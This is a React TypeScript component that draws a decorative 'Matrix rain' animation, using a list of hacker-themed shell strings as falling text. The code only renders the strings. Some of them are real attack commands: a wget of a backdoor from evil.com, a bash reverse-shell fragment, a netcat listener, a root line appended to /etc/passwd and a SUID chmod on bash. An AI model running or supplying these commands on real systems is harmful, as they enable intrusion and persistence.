import { useEffect, useRef } from 'react';

export function MatrixRain() {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    // Linux/hacker themed text for the rain effect
    const linuxText = [
      'root@kali:~# ', '$ ', '> ', 'user@host:/var/www# ', 'hacker@ghost:/# ',
      'ls -la', 'cat /etc/passwd', 'nmap -sS', 'ssh root@', 'tcpdump -i',
      'msfconsole', 'sqlmap -u', 'john --wordlist', 'aircrack-ng -w',
      'strings /bin/bash', 'strace -o trace.log', 'gdb ./binary', 'ltrace ./program',
      'hexdump -C /dev/urandom', 'whoami', 'id', 'uname -a', 'ls -la /root/',
      'cd /var/log && tail -f', 'ps aux | grep', 'netstat -tulpn', 'ss -tuln',
      'iptables -L -v -n', 'sudo !!', 'chmod 4755 /bin/bash',
      'echo "root:x:0:0:root:/root:/bin/bash" >> /etc/passwd',
      'mkdir -p /tmp/.X11-unix', 'wget http://evil.com/backdoor.pl',
      'nc -lvp 4444', 'bash -i >& /dev/tcp/', 'python -c "import pty"',
      'echo "alias ls=ls --color=auto" >> ~/.bashrc',
      'export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH"',
      'alias ll="ls -la"', 'alias grep="grep --color=auto"',
      'HISTSIZE=10000', 'HISTFILESIZE=20000', 'set -o vi',
      'PS1="\\u@\\h:\\w\\$ "', 'umask 022', 'ulimit -n 4096',
      'which nc nmap netcat socat python perl ruby bash sh',
      'find / -name "*.conf" -type f', 'dpkg -l | grep -E "ssh|vsftpd|apache2|mysql"',
      'rpm -qa | grep -E "httpd|dovecot|squid"', 'ls -la /etc/cron.d/',
      'crontab -l', 'atq', 'systemctl list-units --type=service',
      'service --status-all | grep +', 'initctl list', 'runlevel', 'last | head -10',
      'w | head -5', 'who -a', 'groups', 'id -Gn', 'getent passwd | cut -d: -f1',
      'getent group | cut -d: -f1', 'lslogins -u', 'users', 'echo $SHELL',
      'echo $HOME', 'echo $USER', 'echo $HOSTNAME', 'echo $DISPLAY',
      'echo $TERM', 'echo $COLORTERM', 'echo $LANG', 'echo $LC_ALL',
      'echo $PWD', 'echo $OLDPWD', 'echo $SHLVL', 'echo $?',
      'echo $UID', 'echo $EUID', 'echo $GROUPS', 'echo $PPID',
      'echo $PID', 'echo $BASHPID', 'echo $SECONDS', 'echo $RANDOM',
      'echo $LINENO', 'echo $BASH_SOURCE', 'echo $FUNCNAME',
      'echo $BASH_LINENO', 'echo $BASH_ARGC', 'echo $BASH_ARGV',
      'echo $DIRSTACK', 'echo $PIPESTATUS', 'echo $TMOUT', 'echo $HISTCMD',
      'echo $HOSTTYPE', 'echo $OSTYPE', 'echo $MACHTYPE', 'echo $VENDOR',
      '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
      'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
      'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
    ];
    const charArray = linuxText;
    
    const fontSize = 14;
    const columns = Math.floor(canvas.width / fontSize);
    
    const drops: number[] = [];
    for (let i = 0; i < columns; i++) {
      drops[i] = Math.random() * -100;
    }
    
    let frameCount = 0;
    let animationId: number;
    
    const draw = () => {
      frameCount++;
      
      // Slow down the animation (render every 2nd frame)
      if (frameCount % 2 !== 0) {
        animationId = requestAnimationFrame(draw);
        return;
      }
      
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      ctx.font = `${fontSize}px 'JetBrains Mono', monospace`;
      
      for (let i = 0; i < drops.length; i++) {
        const textIndex = Math.floor(Math.random() * charArray.length);
        const text = charArray[textIndex];
        
        // Varying green shades for that authentic terminal look
        const green = Math.floor(Math.random() * 155 + 100);
        ctx.fillStyle = `rgb(0, ${green}, 0)`;
        
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
      
      animationId = requestAnimationFrame(draw);
    };
    
    draw();
    
    const handleResize = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    
    window.addEventListener('resize', handleResize);
    
    return () => {
      cancelAnimationFrame(animationId);
      window.removeEventListener('resize', handleResize);
    };
  }, []);
  
  return (
    <canvas
      ref={canvasRef}
      className="matrix-bg"
      style={{ position: 'fixed', top: 0, left: 0, zIndex: 0 }}
    />
  );
}
